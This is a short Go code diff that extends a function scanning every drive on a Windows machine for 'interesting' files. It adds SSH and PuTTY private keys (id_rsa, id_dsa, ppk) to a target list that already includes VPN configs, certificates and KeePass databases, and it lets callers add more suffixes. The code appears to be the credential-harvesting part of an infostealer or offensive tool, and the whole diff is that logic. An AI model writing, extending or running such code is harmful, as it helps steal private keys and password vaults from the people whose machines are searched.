@@ -16,16 +16,18 @@ func getdrives() (r []string) {
 	return
 }
 
-func FindFiles() []string {
+func FindFiles(additionalSuffixes []string) []string {
 
 	var (
 		interesting = []string{
 			"ovpn",
-			"key",
 			"pem",
+			"ppk",
 			"cert",
 			"ssh",
 			"kdbx",
+			"id_rsa",
+			"id_dsa",
 		}
 
 		interestingFilesList []string
@@ -33,7 +35,7 @@ func FindFiles() []string {
 		drives = getdrives()
 	)
 
-
+	interesting = append(interesting, additionalSuffixes...)
 
 	for driveNum := range drives {
 		var root = drives[driveNum] + ":\\\\"
